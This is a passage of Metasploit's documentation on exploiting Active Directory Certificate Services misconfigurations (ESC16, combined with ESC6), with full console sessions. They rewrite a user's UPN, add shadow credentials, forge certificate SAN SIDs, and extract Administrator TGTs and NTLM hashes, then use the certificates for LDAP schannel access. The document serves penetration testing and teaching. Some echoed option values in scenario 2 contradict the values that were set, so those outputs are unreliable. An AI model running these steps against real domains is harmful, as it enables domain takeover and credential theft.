</code></pre></div></div><p>Finally, <em>this</em> certificate can be used to authenticate to Kerberos with the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module.</p><h1 id="exploiting-esc16"> <a href="#exploiting-esc16" class="anchor-heading" aria-labelledby="exploiting-esc16"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC16</h1><p>ESC16 refers to a CA-level misconfiguration where the SID security extension (OID <code class="language-plaintext highlighter-rouge">1.3.6.1.4.1.311.25.2</code>), introduced in the May 2022 KB5014754 update, is globally disabled. This extension allows domain controllers to securely map certificates to user or computer SIDs for strong authentication.</p><p>When this OID is listed under the CA’s <code class="language-plaintext highlighter-rouge">DisableExtensionList</code> registry key, which is located: <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\&lt;CA-Name&gt;\PolicyModules\&lt;PolicyModuleName&gt;\</code> all certificates issued by the CA will lack the SID binding, making every template behave as though it has the <code class="language-plaintext highlighter-rouge">CT_FLAG_NO_SECURITY_EXTENSION</code> flag (essentially ESC9). After updating the <code class="language-plaintext highlighter-rouge">DisableExtensionList</code> the machine will need to be restarted for the changes to take effect. The <code class="language-plaintext highlighter-rouge">DisableExtensionList</code> under the default policy can be updated in order to exploit (a new policy is not required).</p><h2 id="esc16-scenario-1"> <a href="#esc16-scenario-1" class="anchor-heading" aria-labelledby="esc16-scenario-1"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ESC16 Scenario 1</h2><p>If domain controllers aren’t in Full Enforcement mode (<code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> != 2), they fall back to weaker mapping methods like UPN or DNS from the certificate’s SAN potentially reintroducing risks similar to the Certifried vulnerability (CVE-2022-26923) or ESC9 however for our purposes given the <code class="language-plaintext highlighter-rouge">DisableExtensionList</code> is called “ESC16 Scenario 1”. The way you exploit ESC16 scenario 1 with Metasploit is identical to how you would exploit ESC9:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set rhosts 172.16.199.200
rhosts =&gt; 172.16.199.200
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldaprport 389
ldaprport =&gt; 389
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set target_username user2
target_username =&gt; user2
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapdomain kerberos.issue
ldapdomain =&gt; kerberos.issue
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldappassword N0tpassword!
ldappassword =&gt; N0tpassword!
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapusername user1
ldapusername =&gt; user1
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set UPDATE_LDAP_OBJECT_VALUE Administrator
UPDATE_LDAP_OBJECT_VALUE =&gt; Administrator
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ca kerberos-dc2-ca
ca =&gt; kerberos-dc2-ca
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set cert_template ESC16-Template
cert_template =&gt; ESC16-Template
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; run
[*] Running module against 172.16.199.200
[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Current value of user2's userPrincipalName: user2
[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
[+] The operation completed successfully!
[*] 172.16.199.200:445 - Adding shadow credentials for user2
[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Discovering base DN automatically
[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717152132_default_172.16.199.200_windows.ad.cs_473934.pfx
[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 0d055983-7921-797a-529e-259b4b7542a2
[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
[*] 172.16.199.200:445 - Getting hash for user2
[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
[+] 172.16.199.200:88 - Received a valid TGT-Response
[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152132_default_172.16.199.200_mit.kerberos.cca_930617.bin
[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
[+] 172.16.199.200:88 - Received a valid TGS-Response
[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152132_default_172.16.199.200_mit.kerberos.cca_355422.bin
[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
[+] 172.16.199.200:445 - The requested certificate was issued.
[*] 172.16.199.200:445 - Certificate Policies:
[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
[*] 172.16.199.200:445 - Certificate UPN: Administrator
[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717152134_default_172.16.199.200_windows.ad.cs_383174.pfx
[*] 172.16.199.200:445 - reverting ldap object
[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Discovering base DN automatically
[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
[+] Deleted entry with device ID 0d055983-7921-797a-529e-259b4b7542a2
[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Current value of user2's userPrincipalName: Administrator
[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
[+] The operation completed successfully!
[*] Auxiliary module execution completed
</code></pre></div></div><p>With the certificate issued, the attacker can then use the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module to obtain the hash of the admin user:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary(admin/kerberos/get_ticket) &gt; get_hash rhost=172.16.199.200 cert_file=//Users/jheysel/.msf4/loot/20250717152134_default_172.16.199.200_windows.ad.cs_383174.pfx username=Administrator domain=kerberos.issue
[*] Running module against 172.16.199.200
[!] Warning: Provided principal and realm (Administrator@kerberos.issue) do not match entries in certificate:
[!]   * Administrator@
[+] 172.16.199.200:88 - Received a valid TGT-Response
[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152325_default_172.16.199.200_mit.kerberos.cca_344926.bin
[*] 172.16.199.200:88 - Getting NTLM hash for Administrator@kerberos.issue
[+] 172.16.199.200:88 - Received a valid TGS-Response
[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152325_default_172.16.199.200_mit.kerberos.cca_598018.bin
[+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
[*] Auxiliary module execution completed
</code></pre></div></div><h4 id="esc16-scenario-2"> <a href="#esc16-scenario-2" class="anchor-heading" aria-labelledby="esc16-scenario-2"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ESC16 Scenario 2</h4><p>If domain controllers are in Full Enforcement mode (<code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> == 2), ESC16 alone would normally prevent authentication using certificates that lack the required SID extension. However, if the CA is also vulnerable to ESC6, which is defined as: <code class="language-plaintext highlighter-rouge">EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag is set under it’s <code class="language-plaintext highlighter-rouge">EditFlags</code> registry key, located here: <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\&lt;CA-Name&gt;\PolicyModules\&lt;PolicyModuleName&gt;\</code> then the CA accepts arbitrary SAN values from certificate request attribute and an attacker can still bypass strong certificate mapping.</p><p>In this case, the attacker requests a certificate from the ESC16-affected CA using any client authentication template (like “User”), which ensures the SID security extension is omitted. At the same time, they exploit the ESC6 weakness to inject a custom Subject Alternative Name that includes both a forged UPN and a specially crafted SID value using the format: <code class="language-plaintext highlighter-rouge">URI:tag:microsoft.com,2022-09-14:sid:&lt;SID&gt;</code>. This format was introduced in the May 2022 KB5014754 update and intended to help support strong certificate mappings between the user SID and the certificate.</p><p>Because the certificate lacks the official SID extension (due to ESC16) but includes a valid-looking SAN SID URI (via ESC6), the domain controller accepts it and maps the certificate using the supplied SID—even in Full Enforcement mode.</p><p>The way you would exploit ESC16 Scenario 2 with Metasploit is different than Scenario 1 as we don’t need to update any LDAP objects, and so we can use the <code class="language-plaintext highlighter-rouge">icpr_cert</code> module to request a certificate.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary(admin/dcerpc/icpr_cert) &gt;  set alt_sid S-1-5-21-2324486357-3075865580-3606784161-500
alt_sid =&gt; S-1-5-21-1655260159-4293876351-2321352318-500
msf6 auxiliary(admin/dcerpc/icpr_cert) &gt;  set alt_upn Administrator@kerberos.issue
alt_upn =&gt; Administrator@msf.local
msf6 auxiliary(admin/dcerpc/icpr_cert) &gt;  set ca kerberos-DC2-CA
ca =&gt; msf-DC3-CA
msf6 auxiliary(admin/dcerpc/icpr_cert) &gt;  set cert_template User
cert_template =&gt; User
msf6 auxiliary(admin/dcerpc/icpr_cert) &gt;  set RHOSTS 172.16.199.200
RHOSTS =&gt; 172.16.199.130
msf6 auxiliary(admin/dcerpc/icpr_cert) &gt;  set smbdomain kerberos.issue
smbdomain =&gt; msf.local
msf6 auxiliary(admin/dcerpc/icpr_cert) &gt;  set smbpass N0tpassword!
smbpass =&gt; N0tpassword!
msf6 auxiliary(admin/dcerpc/icpr_cert) &gt;  set smbuser user1
smbuser =&gt; user1
msf6 auxiliary(admin/dcerpc/icpr_cert) &gt; run
[*] Running module against 172.16.199.200
[+] 172.16.199.200:445 - The requested certificate was issued.
[*] 172.16.199.200:445 - Certificate Policies:
[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.4 (Secure Email)
[*] 172.16.199.200:445 -   * 1.3.6.1.4.1.311.10.3.4 (Encrypting File System)
[*] 172.16.199.200:445 - Certificate UPN: Administrator@kerberos.issue
[*] 172.16.199.200:445 - Certificate URI: tag:microsoft.com,2022-09-14:sid:S-1-5-21-2324486357-3075865580-3606784161-500, S-1-5-21-2324486357-3075865580-3606784161-500
[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250711145606_default_172.16.199.200_windows.ad.cs_597422.pfx
[*] Auxiliary module execution completed


msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; use admin/kerberos/get_ticket
[*] Using action GET_TGT - view all 3 actions with the show actions command
msf6 auxiliary(admin/kerberos/get_ticket) &gt; get_hash rhost=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250711145606_default_172.16.199.200_windows.ad.cs_597422.pfx
[*] Running module against 172.16.199.200
[+] 172.16.199.200:88 - Received a valid TGT-Response
[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250711145619_default_172.16.199.200_mit.kerberos.cca_635830.bin
[*] 172.16.199.200:88 - Getting NTLM hash for Administrator@kerberos.issue
[+] 172.16.199.200:88 - Received a valid TGS-Response
[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250711145619_default_172.16.199.200_mit.kerberos.cca_787259.bin
[+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
[*] Auxiliary module execution completed
</code></pre></div></div><h1 id="authenticating-with-a-certificate"> <a href="#authenticating-with-a-certificate" class="anchor-heading" aria-labelledby="authenticating-with-a-certificate"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Authenticating With A Certificate</h1><p>Metasploit supports authenticating with certificates in a couple of different ways. These techniques can be used to take further actions once a certificate has been issued for a particular identity (such as a Domain Admin user).</p><h2 id="authenticating-to-kerberos"> <a href="#authenticating-to-kerberos" class="anchor-heading" aria-labelledby="authenticating-to-kerberos"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Authenticating To Kerberos</h2><p>Certificates can be used to authenticate to Kerberos using the <a href="/docs/pentesting/active-directory/kerberos/get_ticket.html">kerberos/get_ticket</a> module by specifying the <code class="language-plaintext highlighter-rouge">CERT_FILE</code> option. Take the certificate file from the last stage of the attack and set it as the <code class="language-plaintext highlighter-rouge">CERT_FILE</code>. Certificates from Metasploit do not require a password, but if the certificate was generated from a source that added one, it can be specified in the <code class="language-plaintext highlighter-rouge">CERT_PASSWORD</code> option. Set the <code class="language-plaintext highlighter-rouge">RHOST</code> to the Domain Controller which is the Key Distribution Center (KDC) for the Active Directory environment.</p><h3 id="getting-an-nt-hash"> <a href="#getting-an-nt-hash" class="anchor-heading" aria-labelledby="getting-an-nt-hash"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Getting An NT Hash</h3><p>Certificates can be used to obtain the NTLM hash of an account with the PKINIT extension. To request the hash, set the action to <code class="language-plaintext highlighter-rouge">GET_HASH</code>.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/kerberos/get_ticket</span><span class="p">)</span> <span class="p">&gt;</span> get_hash rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zg">[+]</span> 172.30.239.85:88 - Received a valid TGT-Response
<span class="zs">[*]</span> 172.30.239.85:88 - TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230505094204_default_172.30.239.85_mit.kerberos.cca_324339.bin
<span class="zs">[*]</span> 172.30.239.85:88 - Getting NTLM hash for Administrator@daforest.com
<span class="zg">[+]</span> 172.30.239.85:88 - Received a valid TGS-Response
<span class="zs">[*]</span> 172.30.239.85:88 - TGS MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230505094204_default_172.30.239.85_mit.kerberos.cca_031414.bin
<span class="zg">[+]</span> Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/kerberos/get_ticket</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><h3 id="getting-a-kerberos-ticket"> <a href="#getting-a-kerberos-ticket" class="anchor-heading" aria-labelledby="getting-a-kerberos-ticket"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Getting A Kerberos Ticket</h3><p>Certificates can be used to issue a Kerberos ticket granting ticket (TGT) which in turn can be used to authenticate to services such as HTTP, LDAP and SMB. Ticket granting tickets can be requested using the <code class="language-plaintext highlighter-rouge">GET_TGT</code> action.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/kerberos/get_ticket</span><span class="p">)</span> <span class="p">&gt;</span> get_tgt rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230124173224_default_172.30.239.85_windows.ad.cs_287833.pfx
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:88 - Getting TGT for Administrator@daforest.com
<span class="zg">[+]</span> 172.30.239.85:88 - Received a valid TGT-Response
<span class="zs">[*]</span> 172.30.239.85:88 - TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230124202354_default_172.30.239.85_mit.kerberos.cca_566767.bin
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/kerberos/get_ticket</span><span class="p">)</span> <span class="p">&gt;</span> klist
Kerberos Cache
==============
host           principal                   sname                             issued                     status  path
----           ---------                   -----                             ------                     ------  ----
172.30.239.85  Administrator@daforest.com  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-01-24 20:23:54 -0500  valid   /home/smcintyre/.msf4/loot/20230124202354_default_172.30.239.85_mit.kerberos.cca_566767.bin

<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/kerberos/get_ticket</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>Once the TGT has been issued, it can be seen in the output of the <code class="language-plaintext highlighter-rouge">klist</code> command. With the TGT saved, it will automatically be used in the future to request ticket granting services (TGS) for authentication to specific services.</p><h2 id="authenticating-to-ldap"> <a href="#authenticating-to-ldap" class="anchor-heading" aria-labelledby="authenticating-to-ldap"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Authenticating To LDAP</h2><p>Certificates can also be used to directly authenticate to LDAP using schannel. Metasploit modules that use the builtin LDAP library (including <code class="language-plaintext highlighter-rouge">auxiliary/gather/ldap_query</code>) offer this as an authentication option that can be enabled. To use schannel authentication a few options must be set.</p><ul><li><code class="language-plaintext highlighter-rouge">LDAP::Auth</code> – must be set to <code class="language-plaintext highlighter-rouge">schannel</code><li><code class="language-plaintext highlighter-rouge">LDAP::CertFile</code> – must be set to the PFX certificate file with which to authenticate<li><code class="language-plaintext highlighter-rouge">SSL</code> – must be set to <code class="language-plaintext highlighter-rouge">true</code> (<code class="language-plaintext highlighter-rouge">schannel</code> authentication is only compatible with TLS connections)</ul><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span> set LDAP::Auth schannel
LDAP::Auth =&gt; schannel
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span> set LDAP::CertFile /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
LDAP::CertFile =&gt; /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span> set SSL true
<span class="zw">[!]</span> Changing the SSL option's value may require changing RPORT!
SSL =&gt; true
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span> enum_domain
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> Discovering base DN automatically
<span class="zg">[+]</span> 172.30.239.85:389 Discovered base DN: DC=daforest,DC=com
<span class="zg">[+]</span> 172.30.239.85:389 Discovered schema DN: DC=daforest,DC=com
DC=msflab DC=local
==================

 Name                       Attributes
 ----                       ----------
 lockoutduration            0:00:30:00
 lockoutthreshold           0
 maxpwdage                  42:00:00:00
 minpwdage                  1:00:00:00
 minpwdlength               7
 ms-ds-machineaccountquota  10
 name                       msflab
 objectsid                  S-1-5-21-3402587289-1488798532-3618296993

<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><hr><footer><p><a href="#top" id="back-to-top">Back to top</a></p><p class="text-small text-grey-dk-000 mb-0"> <a href="https://github.com/rapid7/metasploit-framework/tree/master/docs/metasploit-framework.wiki/ad-certificates/Attacking-AD-CS-ESC-Vulnerabilities.md" id="edit-this-page">Edit this page on GitHub</a></p></footer></div></div><div class="search-overlay"></div></div><script type="text/javascript" src="/assets/js/toggle_mode.js"></script> <script> var config = { theme: 'default', logLevel: 'fatal', securityLevel: 'strict', startOnLoad: true, arrowMarkerAbsolute: false, er: { diagramPadding: 20, layoutDirection: 'TB', minEntityWidth: 100, minEntityHeight: 75, entityPadding: 15, stroke: 'gray', fill: 'honeydew', fontSize: 12, useMaxWidth: true, }, flowchart:{ diagramPadding: 8, htmlLabels: true, curve: 'basis', }, sequence: { diagramMarginX: 50, diagramMarginY: 10, actorMargin: 50, width: 150, height: 65, boxMargin: 10, boxTextMargin: 5, noteMargin: 10, messageMargin: 35, messageAlign: 'center', mirrorActors: true, bottomMarginAdj: 1, useMaxWidth: true, rightAngles: false, showSequenceNumbers: false, }, gantt: { titleTopMargin: 25, barHeight: 20, barGap: 4, topPadding: 50, leftPadding: 75, fontSize: 11, gridLineStartPadding: 35, fontFamily: '\'Open Sans\', sans-serif', numberSectionStyles: 4, axisFormat: '%Y-%m-%d', topAxis: false, }, }; mermaid.initialize(config); window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid')); </script>
